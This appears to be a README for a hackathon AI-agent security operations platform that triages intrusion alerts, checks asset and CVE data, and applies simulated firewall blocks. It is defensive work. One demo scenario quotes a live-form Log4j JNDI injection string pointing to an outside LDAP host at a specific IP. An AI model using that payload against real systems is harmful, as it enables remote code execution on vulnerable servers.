# Aegis Security — Enterprise Incident Detection, Investigation & Response

[![Track](https://img.shields.io/badge/Hackathon-Track%205%3A%20Cybersecurity-059669?style=flat-square)](https://github.com/Sunil56224972/Agies-Security)
[![Problem Statement](https://img.shields.io/badge/Problem%20Statement-PS--9%20Autonomous%20SOC-2563EB?style=flat-square)](https://github.com/Sunil56224972/Agies-Security)
[![Database](https://img.shields.io/badge/Database-Neon%20Serverless%20Postgres-00E599?style=flat-square)](https://neon.tech)
[![Inference Engine](https://img.shields.io/badge/Inference-Groq%20Cloud%20LPU-F59E0B?style=flat-square)](https://groq.com)
[![Architecture](https://img.shields.io/badge/Agent%20Architecture-ReAct%20Multi--Turn%20Loop-7C3AED?style=flat-square)](https://github.com/Sunil56224972/Agies-Security)
[![Standards](https://img.shields.io/badge/Standards-NIST%20SP%20800--61%20%7C%20MITRE%20D3FEND-DC2626?style=flat-square)](https://d3fend.mitre.org)

> **Enterprise-grade autonomous Security Operations Center (SOC) investigation and response platform.**  
> Directly addresses **Track 5 (Cybersecurity) — Problem Statement 9**. Features autonomous multi-turn ReAct reasoning, 8 bidirectional environment tools, distributed state persistence in **Neon PostgreSQL**, dynamic action-observation replanning, objective defense verification, and demonstrable changed-condition / failure handling.

---

## Table of Contents
- [Executive Overview](#executive-overview)
- [System Architecture & Data Flow](#system-architecture--data-flow)
- [Common Agentic Requirements Compliance Matrix](#common-agentic-requirements-compliance-matrix)
- [8 Sandboxed Telemetry Tools](#8-sandboxed-telemetry-tools)
- [Neon PostgreSQL Database Schema](#neon-postgresql-database-schema)
- [Interactive Application Views](#interactive-application-views)
- [Demonstrable Judging Scenarios](#demonstrable-judging-scenarios)
- [REST & Server-Sent Events (SSE) API Reference](#rest--server-sent-events-sse-api-reference)
- [Local Setup & Getting Started](#local-setup--getting-started)
- [License & Security](#license--security)

---

## Executive Overview

Modern security teams face alert fatigue from high-velocity Network Intrusion Detection Systems (NIDS) like Snort and Suricata. In traditional SOCs, human analysts must manually correlate alerts with asset configuration management databases (CMDB), cross-reference CVE vulnerability feeds, and parse endpoint access logs to verify whether an exploit succeeded or failed.

**Aegis Security** automates Tier-3 triage and containment through a goal-driven autonomous agent. Instead of producing one-shot speculative text, Aegis decomposes high-level incident response objectives into a multi-turn ReAct loop that:
1. **Ingests & Decodes:** Extracts L7 packet payloads from raw sensor PCAP streams.
2. **Correlates CMDB & CVEs:** Identifies target operating systems, installed package versions, and vulnerability prerequisites.
3. **Validates Ground Truth:** Audits web access logs, authentication logs, and EDR process execution trees on the target server.
4. **Enforces Containment:** Deploys simulated perimeter firewall drop rules to isolate compromised nodes or block attacker IPs.
5. **Verifies Defense State:** Probes the Netfilter kernel simulator to objectively prove packets from the adversary IP are dropped.
6. **Records State in Neon PostgreSQL:** Commits auditable investigation reports with MITRE ATT&CK mappings and confidence scores.

---

## System Architecture & Data Flow

```
                                  AEGIS SECURITY PLATFORM
                                 ─────────────────────────
                                 
      ┌────────────────────────────────────────────────────────────────────────┐
      │                         NETWORK SENSOR INGESTION                       │
      │   Snort / Suricata NIDS Event Stream ──► Ingress Telemetry Queue       │
      └───────────────────────────────────┬────────────────────────────────────┘
                                          │
                                          ▼
      ┌────────────────────────────────────────────────────────────────────────┐
      │               AUTONOMOUS SOC REASONING KERNEL (GROQ LPU)               │
      │   Model: LLaMA 3.3 70B / 3.1 8B via Groq Cloud High-Speed LPU          │
      │   Loop: Multi-Turn ReAct (Reasoning ──► Tool Call ──► Observation)     │
      └─────────┬─────────────────────────┬──────────────────────────┬─────────┘
                │                         │                          │
   [Observation Feedback]          [Tool Dispatch]            [State Commit]
                │                         │                          │
                ▼                         ▼                          ▼
 ┌───────────────────────────┐ ┌──────────────────────┐ ┌──────────────────────┐
 │   8 SANDBOX SOC TOOLS     │ │  NETFILTER SIMULATOR │ │   NEON POSTGRESQL    │
 │ - ingest_nids_alerts      │ │ - iptables DROP rule │ │ - soc_alerts         │
 │ - get_packet_metadata     │ │ - Connection RST     │ │ - soc_assets         │
 │ - lookup_asset_inventory  │ │ - Packet drop probe  │ │ - soc_cve_kb         │
 │ - query_cve_kb            │ │ - Counter increment  │ │ - soc_firewall_rules │
 │ - query_server_logs       │ └──────────────────────┘ │ - soc_investigations │
 │ - execute_firewall_action │                          │ - soc_server_logs    │
 │ - verify_defense_state    │                          │ - execution_logs     │
 │ - record_investigation    │                          │ - app_config         │
 └───────────────────────────┘                          └──────────────────────┘
```

---

## Common Agentic Requirements Compliance Matrix

The platform is designed and evaluated strictly against the hackathon **Common Agentic Requirements**:

| # | Common Agentic Requirement | Live Platform Implementation | Ground-Truth Verification |
|---|---|---|---|
| **1** | **Goal-driven execution rather than one-shot answer generation** | Accepts high-level operational goals (e.g. `"Investigate NIDS alert ALERT-2026-9001 to establish whether the attack succeeded or failed..."`) and autonomously orchestrates a multi-turn ReAct loop (up to 16 reasoning turns) to reach a verified outcome. | Live SSE stream (`/api/soc/investigate/stream`) exposes each intermediate decision, tool call, and evidence synthesis. |
| **2** | **Meaningful tool/environment interaction** | Interacts bidirectionally with 8 production-grade environment tools querying Neon PostgreSQL, inspecting PCAPs, parsing Apache/Tomcat logs, querying CVE intelligence, and controlling Netfilter drop tables. | Real SQL queries executed on Neon PostgreSQL (AWS `ap-southeast-1`); zero mocked static responses. |
| **3** | **Persistent task state across turns & sessions** | All intermediate reasoning steps, tool arguments, outputs, MITRE ATT&CK classifications, confidence scores, and firewall states persist across turns in Neon PostgreSQL. | Live audit tables: `soc_investigations`, `soc_firewall_rules`, `execution_logs`, `chat_sessions`, `chat_messages`. |
| **4** | **Action followed by observation/feedback, with replanning** | The agent systematically inspects tool execution observations. If server logs show HTTP 401/404 or runtime software does not match exploit prerequisites, the agent detects the condition mismatch and dynamically replans its hypothesis. | Demonstrated live in `AutonomousSocAgent.investigate()`. |
| **5** | **Verification of final outcome against objective constraints** | Containment actions are not assumed to succeed upon dispatch. An objective evaluator (`verify_defense_state`) triggers a live probe against the Netfilter sandbox (`/api/soc/firewall/probe`) to confirm `connection_state: RST_SENT_PACKETS_DROPPED`. | Returns real kernel packet drop counts and timestamped verification proofs. |
| **6** | **Demonstrable failure, conflict, or changed-condition scenario** | **Scenario 6A (Incompatible Stack / Changed Condition):** Adversary fires Log4j exploit (`ALERT-2026-9003`) at `10.0.4.22`. The agent queries CMDB, identifies target is **Python 3.10 / FastAPI** (no Java/Log4j runtime), inspects logs (HTTP 401), detects mismatch, **replans to `FALSE_POSITIVE`**, and avoids blocking the host.<br>**Scenario 6B (Conflict & Human Override):** Human analyst submits ground-truth override via `/api/soc/override`, triggering automated policy adaptation. | 1-Click executable in the **Agentic Evaluation Matrix** tab. The live terminal displays condition detection and replanning rationale. |
| **7** | **Open architecture: participant freedom** | Modular enterprise architecture: Network Ingestion Sensor $\rightarrow$ Autonomous Groq LPU Reasoning Kernel $\rightarrow$ 8 Tool Executors $\rightarrow$ Neon PostgreSQL State Store $\rightarrow$ Netfilter Containment Simulator. | Fully documented via `/api/health` and `/api/soc/config`. Supports autonomous single-agent triage and multi-agent supervisor/worker scaling. |

---

## 8 Sandboxed Telemetry Tools

The agent has access to 8 deterministic tools registered with the LLM via OpenAI/Groq function calling specifications:

```json
[
  {
    "name": "ingest_nids_alerts",
    "description": "Ingest and list simulated NIDS, Snort, and Suricata intrusion detection alerts. Returns alert signatures, source IP, destination IP, port, and severity."
  },
  {
    "name": "get_packet_metadata",
    "description": "Retrieve low-level packet metadata, protocol flags, headers, and raw hex/decoded packet payload captured by the network sensor for a given alert."
  },
  {
    "name": "lookup_asset_inventory",
    "description": "Look up target host asset information from the CMDB/Asset Inventory: OS family and version, running services, open ports, installed software packages, and WAF protection status."
  },
  {
    "name": "query_cve_kb",
    "description": "Query the synthetic CVE Knowledge Base for vulnerability intelligence: CVSS score, affected products and versions, exploit vectors, prerequisites, and remediation guidelines."
  },
  {
    "name": "query_server_logs",
    "description": "Retrieve web server access logs, Linux auth.log, syslog, or EDR process execution trees from the target server around the alert timestamp to verify whether the exploit actually executed."
  },
  {
    "name": "execute_firewall_action",
    "description": "Execute a simulated perimeter firewall or host containment response action in the security sandbox. Adds a drop rule to prevent further lateral movement or C2 beaconing."
  },
  {
    "name": "verify_defense_state",
    "description": "Simulate a post-action environmental re-check to confirm that the firewall/isolation rule is active and packets from the adversary IP are being dropped."
  },
  {
    "name": "record_investigation_verdict",
    "description": "Commit the final evidence-backed incident assessment to the SOC database with attack outcome determination, confidence score, MITRE ATT&CK mapping, and actions taken."
  }
]
```

---

## Neon PostgreSQL Database Schema

The database runs on **Neon Serverless PostgreSQL** (AWS `ap-southeast-1`), connected via the `@neondatabase/serverless` and `pg` pooler. All tables are created automatically on boot:

| Table Name | Description | Key Columns |
|---|---|---|
| `soc_alerts` | Ingested NIDS events | `alert_id`, `signature`, `category`, `severity`, `source_ip`, `dest_ip`, `dest_port`, `protocol`, `raw_payload`, `status` |
| `soc_assets` | CMDB asset inventory | `ip_address`, `hostname`, `os_family`, `os_version`, `running_services`, `installed_packages`, `criticality`, `waf_enabled`, `last_scanned` |
| `soc_cve_kb` | Vulnerability intelligence | `cve_id`, `title`, `cvss_score`, `affected_products`, `description`, `exploit_prerequisites`, `remediation` |
| `soc_server_logs` | Endpoint telemetry | `host_ip`, `log_type`, `timestamp`, `status_code`, `request_method`, `request_uri`, `response_bytes`, `client_ip`, `raw_entry` |
| `soc_firewall_rules` | Containment drop rules | `rule_id`, `target_ip`, `action`, `reason`, `enacted_by`, `is_active`, `packets_dropped`, `created_at` |
| `soc_investigations` | Incident assessments | `investigation_id`, `alert_id`, `target_ip`, `attacker_ip`, `attack_outcome`, `confidence_score`, `mitre_tactic`, `mitre_technique`, `evidence_summary`, `actions_taken`, `human_override` |
| `execution_logs` | Full audit trace | `session_id`, `step_type`, `label`, `detail`, `tool_name`, `tool_args`, `tool_result`, `duration_ms` |
| `tool_usage_stats` | Tool performance metrics | `tool_name`, `total_calls`, `total_successes`, `total_failures`, `avg_duration_ms`, `last_used_at` |
| `app_config` | Persistent policies | `key`, `value`, `updated_at` |
| `chat_sessions` | Session management | `id`, `title`, `created_at`, `updated_at` |
| `chat_messages` | Message transcripts | `id`, `session_id`, `role`, `content`, `tool_name`, `tool_args`, `created_at` |

---

## Interactive Application Views

The user interface follows a B2B security architecture styled after **CrowdStrike Falcon**, **Datadog Cloud SIEM**, and **Palo Alto Networks Cortex**:

### 1. Executive Incident Dashboard (`#view-dashboard`)
Real-time sensor telemetry KPIs, Mean Time to Detect (MTTD < 1.4s), Mean Time to Respond (MTTR < 3.2s), response lifecycle progress bar, verified assessments table, and 1-click defense probe launcher.
![Executive Incident Dashboard](docs/images/dashboard.png)

### 2. Threat Alert Ingestion Feed (`#view-alerts`)
Filterable intrusion alert queue with severity chips (`CRITICAL`, `HIGH`, `ALL`), inline raw payload inspection drawer, and manual test event ingestion modal.
![Threat Alert Feed](docs/images/alerts.png)

### 3. Incident Investigation Studio (`#view-agent`)
Autonomous reasoning pipeline displaying a live execution checklist across all 8 security tools, step-by-step tool latency registry, and markdown incident assessment report with analyst override capabilities.
![Investigation Studio](docs/images/investigation_studio.png)

### 4. Active Containment Rules & Netfilter Defense (`#view-firewall`)
Production perimeter firewall table with rule toggles (`ACTIVE` $\leftrightarrow$ `DISABLED`), manual rule deployment form, and live defense verification probes.
![Active Containment Rules](docs/images/containment_rules.png)

### 5. Asset Inventory (CMDB) & CVE Knowledge Base (`#view-architecture`)
Monitored infrastructure inventory with running services, open ports (80, 443, 5000, 8080), WAF status, and live-searchable CVE intelligence matrix.
![Asset CMDB and CVE Intelligence](docs/images/assets_cve.png)

### 6. Agentic Evaluation Matrix & Hackathon Judging Cockpit (`#view-evaluator`)
Dedicated compliance cockpit validating all 7 Common Agentic Requirements with live terminal streaming, objective defense verifiers, and demonstrable changed-condition scenarios.
![Agentic Evaluation Matrix](docs/images/agentic_evaluator.png)

### 7. Real-Time Perimeter Defense Verification
Objective evaluator probe dynamically incrementing drop counters and validating kernel Netfilter drop rules in Neon PostgreSQL.
![Perimeter Defense Probe](docs/images/defense_probe.png)

---

## Demonstrable Judging Scenarios

Built specifically for live hackathon evaluation and technical review:

### Scenario 6A: Changed Condition / Incompatible Stack Failure
1. **Trigger:** Click `Execute Scenario 6A (Incompatible Stack Demo)` in the Agentic Evaluation Matrix, or investigate alert `ALERT-2026-9003`.
2. **Context:** Adversary launches a Log4j JNDI RCE exploit (`${jndi:ldap://45.154.255.89:1389/Exploit}`) against target host `10.0.4.22`.
3. **Tool Invocations:**
   - `lookup_asset_inventory(ip_address="10.0.4.22")` $\rightarrow$ Target runs **Python 3.10 / FastAPI / Uvicorn** on Debian 11. No Java runtime or Log4j core package exists.
   - `query_server_logs(host_ip="10.0.4.22", log_type="http_access")` $\rightarrow$ Target web server returned **HTTP 401 Unauthorized**. No socket connection was established.
4. **Dynamic Replanning:** The agent detects the condition mismatch: the attack signature is Log4j RCE, but the target environment is completely incompatible. Rather than enforcing an unnecessary IP block, the agent **replans its plan**, classifies the incident as **`FALSE_POSITIVE / INCOMPATIBLE_STACK`**, and avoids disrupting valid network traffic.

### Scenario 6B: Conflict & Human Analyst Feedback Adaptation
1. **Trigger:** Click `Execute Scenario 6B (Analyst Conflict Override)`.
2. **Context:** A lead security analyst reviews an automated assessment and determines through external intelligence that an attack payload was neutralized upstream.
3. **Execution:** The analyst submits an override via `POST /api/soc/override`. The system records the feedback in Neon PostgreSQL, dynamically updates the ground-truth outcome, and adjusts perimeter firewall rules accordingly.

---

## REST & Server-Sent Events (SSE) API Reference

| Endpoint | Method | Description |
|---|---|---|
| `/api/health` | `GET` | Platform health, Neon DB connection status, registered tools, and uptime |
| `/api/soc/stats` | `GET` | Aggregated SOC telemetry metrics, alert breakdowns, and MTTR/MTTD |
| `/api/soc/agentic-status` | `GET` | Operational compliance status and metrics for all 7 Common Agentic Requirements |
| `/api/soc/alerts` | `GET`, `POST` | List alerts (with severity filter) or ingest new test intrusion event |
| `/api/soc/alerts/:id` | `GET` | Fetch specific alert with decoded L7 payload |
| `/api/soc/assets` | `GET` | Query CMDB asset inventory with OS, services, and WAF status |
| `/api/soc/cve` | `GET` | Query CVE intelligence knowledge base with keyword search (`?q=...`) |
| `/api/soc/logs` | `GET` | Retrieve server access logs, auth logs, or EDR process logs |
| `/api/soc/firewall` | `GET` | Fetch active Netfilter perimeter containment rules |
| `/api/soc/firewall/rule` | `POST` | Deploy manual firewall drop/isolate containment rule |
| `/api/soc/firewall/toggle` | `POST` | Toggle containment rule state (`is_active: true/false`) |
| `/api/soc/firewall/probe` | `POST` | Execute objective defense probe validating packet drop rules |
| `/api/soc/investigations` | `GET` | Retrieve historical verified incident assessment reports |
| `/api/soc/investigate/stream` | `POST` | Real-time Server-Sent Events (SSE) stream of autonomous agent ReAct loop |
| `/api/soc/override` | `POST` | Record human analyst override and adapt ground-truth assessment |
| `/api/soc/config` | `GET`, `POST` | Retrieve or update system policy thresholds and reasoning depth |
| `/api/search` | `GET` | Global real-time search across alerts, rules, and network assets |

---

## Local Setup & Getting Started

### Prerequisites
- Node.js 18+ (tested on Node v20/v22/v25)
- Groq Cloud API Key (`groq-sdk` ^1.6.0)
- Neon Serverless PostgreSQL database connection string

### 1. Clone & Install Dependencies
```bash
git clone https://github.com/Sunil56224972/Agies-Security.git
cd Agies-Security
npm install
```

### 2. Configure Environment Variables
Copy `.env.example` to `.env`:
```bash
cp .env.example .env
```
Edit `.env` with your credentials:
```ini
# Groq LPU Inference API Key (https://console.groq.com)
GROQ_API_KEY=gsk_your_groq_api_key_here

# Groq Model Identifier (default: llama-3.3-70b-versatile)
GROQ_MODEL=llama-3.3-70b-versatile

# Application Port
PORT=3000

# Neon Serverless PostgreSQL Database Connection String
DATABASE_URL=postgresql://neondb_owner:your_password@ep-your-instance.aws.neon.tech/neondb?sslmode=require
```

### 3. Database Bootstrap (Automatic & Manual)
- **Automatic on Startup (Recommended):** On boot, `server.js` automatically executes `CREATE TABLE IF NOT EXISTS` for all 11 tables and seeds default CMDB assets, CVE knowledge base entries, and baseline NIDS alerts if tables are empty.
- **Manual Seed SQL:** You can also run [`init_db.sql`](init_db.sql) directly inside the Neon SQL Console to review the full DDL schema and seed dataset.

### 4. Start the Platform
```bash
npm start
```
The server will boot, run `db.init()`, establish the Neon PostgreSQL pool, and bind to `http://localhost:3000`.

### 5. Verify in Browser
Open `http://localhost:3000` in any modern web browser:
- Navigate to **Incident Dashboard** to observe live telemetry.
- Go to **Agentic Evaluation Matrix** and click **Run Automated Compliance Check** to verify all 7 requirements.

---

## License & Security
Built for hackathon demonstration under **Track 5: Cybersecurity (Problem Statement 9)**.  
All attack payloads and containment actions are executed within an isolated, sandboxed emulation environment.
